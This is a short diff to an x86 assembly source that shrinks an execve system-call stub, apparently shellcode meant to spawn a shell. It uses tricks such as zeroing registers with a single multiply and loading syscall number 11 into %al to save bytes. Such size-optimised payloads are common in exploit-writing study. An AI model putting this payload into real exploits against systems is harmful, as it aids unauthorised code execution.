@@ -11,7 +11,14 @@
 
     .global _start
 _start:
+    # char *const argv[]
     xorl %ecx, %ecx
+
+    # mere 2 bytes, both %eax and %edx were zeroed
+    mull %ecx
+
+    # __NR_execve 11
+    movb $11, %al
 
     # '\x00'
     pushl %ecx
@@ -22,16 +29,5 @@ _start:
 
     # const char *filename
     movl %esp, %ebx
-
-    # __NR_execve 11
-    # movb $11, %al
-    pushl $11
-    popl %eax
-
-    # char *const argv[]
-    # xorl %ecx, %ecx
-
-    # char *const envp[]
-    # xorl %edx, %edx
 
     int $0x80
